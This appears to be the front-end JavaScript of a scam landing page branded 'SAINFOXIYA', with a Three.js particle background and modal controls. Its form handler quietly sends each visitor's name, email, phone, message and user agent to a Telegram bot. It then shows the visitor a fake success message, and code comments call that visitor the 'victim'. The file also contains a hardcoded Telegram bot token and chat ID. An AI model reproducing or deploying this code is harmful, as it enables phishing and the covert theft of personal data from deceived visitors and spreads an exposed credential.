// ── CONFIG ── CHANGE THESE ────────────────────────────────────────
const TELEGRAM_BOT_TOKEN = "8235734619:AAEVmjaTSbPBvzKZJuyCOgxXvOb_m5ILWxo";           // 7123456789:AAFxxxxxxxxxxxxxxxxxxxxxxxxxxxx
const TELEGRAM_CHAT_ID    = "8060968649";            // -1001987654321 or @yourchannel

// ── Helpers ───────────────────────────────────────────────────────
function scrollToSection(id) {
    document.getElementById(id)?.scrollIntoView({ behavior: 'smooth' });
}

function toggleMobileMenu() {
    const menu  = document.getElementById('mobile-menu');
    const open  = document.getElementById('hamburger-open');
    const close = document.getElementById('hamburger-close');
    menu.classList.toggle('hidden');
    open.classList.toggle('hidden');
    close.classList.toggle('hidden');
}

function prepareInquiry(product) {
    scrollToSection('contact');
    console.log(`Inquiry for: ${product}`);
}

// ── Send to Telegram with sanitization ────────────────────────────
function sendToTelegram(name, email, phone, message) {
    // Sanitize: remove dangerous chars & trim
    name    = (name    || '').trim().replace(/[<>&"']/g, '');
    email   = (email   || '').trim().replace(/[<>&"']/g, '');
    phone   = (phone   || '').trim().replace(/[<>&"']/g, '');
    message = (message || '').trim().replace(/[<>&"']/g, '');

    const text = 
`🔥 NEW SAINFOXIYA LEAD 🔥
━━━━━━━━━━━━━━━━━━━━━
Name/Title: ${name || '—'}
Email:      ${email || '—'}
Phone:      ${phone || '—'}
Message:
${message || '—'}

Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}
UA: ${navigator.userAgent.slice(0,120)}...`;

    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;

    fetch(url)
        .then(r => r.json())
        .then(data => {
            if (data.ok) console.log("[+] Telegram sent");
            else console.error("Telegram error:", data);
        })
        .catch(err => console.error("Fetch failed:", err));
}

function handleFormSubmit(e) {
    e.preventDefault();

    const form = e.target;
    const name    = form.querySelector('[name="name"]').value;
    const email   = form.querySelector('[name="email"]').value;
    const phone   = form.querySelector('[name="phone"]').value;
    const message = form.querySelector('[name="message"]').value;

    // Send silently to Telegram
    sendToTelegram(name, email, phone, message);

    // Show fake success to victim
    const btn = form.querySelector('button');
    const orig = btn.textContent;
    btn.textContent = "PROCESSING...";
    btn.disabled = true;

    setTimeout(() => {
        alert("Request received. Our team will contact you within 30 minutes.");
        form.reset();
        btn.textContent = orig;
        btn.disabled = false;
    }, 2200);
}

// ── Modal Controls ────────────────────────────────────────────────
function openModal(type) {
    const modal = document.getElementById(`modal-${type}`);
    if (!modal) return;
    modal.classList.remove('hidden');
    document.body.style.overflow = 'hidden';
    setTimeout(() => {
        modal.querySelector('.modal-content').style.opacity = '1';
        modal.querySelector('.modal-content').style.transform = 'translateY(0)';
    }, 10);
}

function closeModal(event, type) {
    if (event && event.target.classList.contains('modal-overlay')) {
        const modal = document.getElementById(`modal-${type}`);
        modal.classList.add('hidden');
        document.body.style.overflow = '';
    } else if (!event) {
        const modal = document.getElementById(`modal-${type}`);
        modal.classList.add('hidden');
        document.body.style.overflow = '';
    }
}

document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape') {
        closeModal(null, 'privacy');
        closeModal(null, 'terms');
    }
});

// ── Three.js background ───────────────────────────────────────────
let scene, camera, renderer, particles;

function init3D() {
    scene = new THREE.Scene();
    camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 2000);
    renderer = new THREE.WebGLRenderer({ alpha: true, antialias: true });
    renderer.setSize(window.innerWidth, window.innerHeight);
    document.getElementById('canvas-container').appendChild(renderer.domElement);

    const geometry = new THREE.BufferGeometry();
    const vertices = [];
    const colors = [];

    for (let i = 0; i < 2800; i++) {
        vertices.push(Math.random() * 2400 - 1200, Math.random() * 2400 - 1200, Math.random() * 2400 - 1200);
        const r = Math.random() < 0.6 ? 0.83 : 0.49;
        const g = Math.random() < 0.6 ? 0.68 : 0.23;
        const b = Math.random() < 0.6 ? 0.22 : 0.92;
        colors.push(r, g, b);
    }

    geometry.setAttribute('position', new THREE.Float32BufferAttribute(vertices, 3));
    geometry.setAttribute('color', new THREE.Float32BufferAttribute(colors, 3));

    const material = new THREE.PointsMaterial({size:2.4, vertexColors:true, transparent:true, opacity:0.65, blending:THREE.AdditiveBlending});
    particles = new THREE.Points(geometry, material);
    scene.add(particles);
    camera.position.z = 900;

    window.addEventListener('resize', () => {
        camera.aspect = window.innerWidth / window.innerHeight;
        camera.updateProjectionMatrix();
        renderer.setSize(window.innerWidth, window.innerHeight);
    });

    animate();
}

function animate() {
    requestAnimationFrame(animate);
    particles.rotation.y += 0.00028;
    particles.rotation.x += 0.00015;
    renderer.render(scene, camera);
}

init3D();

document.getElementById('inquiry-form')?.addEventListener('submit', handleFormSubmit);